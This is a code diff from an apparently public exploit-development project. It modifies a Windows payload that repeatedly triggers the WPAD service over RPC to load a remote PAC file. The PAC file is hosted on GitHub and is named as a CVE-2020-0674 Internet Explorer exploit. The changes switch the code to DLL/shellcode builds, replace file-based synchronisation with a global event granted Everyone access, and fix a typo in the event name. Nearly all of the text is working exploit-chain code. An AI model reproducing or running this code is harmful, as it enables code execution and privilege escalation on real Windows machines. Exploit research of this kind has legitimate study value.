@@ -28,23 +28,20 @@ BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectTy
 // Global settings
 ////////
 
-#define DEBUG
-#define EXE_BUILD
-//#define DLL_BUILD
-//#define SHELLCODE_BUILD
+//#define DEBUG
+//#define EXE_BUILD
+#define DLL_BUILD
+#define SHELLCODE_BUILD
 #define SPOOL_SYNC
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
-
-#define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
-#define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
 
 ////////
 ////////
 // Debug logic
 ////////
 
-#ifdef DEBUG
 void DebugLog(const wchar_t* Format, ...) {
+#ifdef DEBUG
     va_list Args;
     static wchar_t* pBuffer = NULL;
 
@@ -65,8 +62,8 @@ void DebugLog(const wchar_t* Format, ...) {
     printf("%ws\r\n", pBuffer);
 #endif
     //HeapFree(GetProcessHeap(), 0, pBuffer);
-}
 #endif
+}
 
 ////////
 ////////
@@ -218,23 +215,12 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+    HANDLE hEvent;
 #ifdef DEBUG
     DebugLog(L"... DllMain executed");
-    if (CreateEventW(NULL, TRUE, FALSE, L"Local\\DoubleStarEvent1")) {
-        DebugLog(L"... successfully created local double star event obj");
-    }
-    else {
-        DebugLog(L"... failed to create local double star event obj");
-    }
-    if (CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent2")) {
-        DebugLog(L"... successfully created global double star event obj");
-    }
-    else {
-        DebugLog(L"... failed to create global double star event obj");
-    }
 #endif
     switch (dwReason) {
-        case DLL_PROCESS_ATTACH:
+        case DLL_PROCESS_ATTACH: 
 #ifdef SHELLCODE_BUILD
             /*
             SpoolPotato/WPAD client synchronization
@@ -261,59 +247,32 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
             4. Terminates itself.
             */
 
-            if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
-                HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);
+            if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent")) != NULL) {
+                if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
+#ifdef DEBUG
+                    DebugLog(L"... successfully set Everyone ACL on event object");
+#endif
+                    while (TRUE) {
+                        DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", TARGET_PAC_URL);
+                        RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
+                        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
 
-                if (hFile != INVALID_HANDLE_VALUE) {
-                    CloseHandle(hFile);
-#ifdef DEBUG
-                    DebugLog(L"... setting Everyone ACL on %ws", SYNC_FILE);
-#endif
-                    if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
-#ifdef DEBUG
-                        DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
-#endif
-                        while (TRUE) {
-#ifdef DEBUG
-                            DebugLog(L"... sending PAC update RPC signal to WPAD...");
-#endif
-                            RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
-#ifdef DEBUG
-                            DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
-#endif
-                            Sleep(2000);
-                            hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-
-                            if (hFile == INVALID_HANDLE_VALUE) {
-#ifdef DEBUG
-                                DebugLog(L"... received sync signal from code within WPAD");
-#endif
-                                break;
-                            }
-                            else {
-                                CloseHandle(hFile);
-#ifdef DEBUG
-                                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
-#endif
-                            }
+                        if (WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
+                            DebugLog(L"... received sync signal from code within WPAD");
+                            break;
                         }
-                    }
-                    else {
-#ifdef DEBUG
-                        DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
-#endif
+                        else {
+                            DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+                        }
                     }
                 }
                 else {
-#ifdef DEBUG
-                    DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
-#endif
+                    CloseHandle(hEvent);
+                    DebugLog(L"... failed to set Everyone ACL on global event object");
                 }
             }
             else {
-#ifdef DEBUG
-                DebugLog(L"... failed to create %ws", SYNC_FOLDER);
-#endif
+                DebugLog(L"... failed to create sync event");
             }
 #else
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
@@ -362,7 +321,7 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 #ifdef SPOOL_SYNC
         HANDLE hEvent;
 
-        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Globaal\\DoubleStarEvent"))) {
+        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent")) != NULL) {
             if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
                 DebugLog(L"... successfully set Everyone ACL on event object");
 
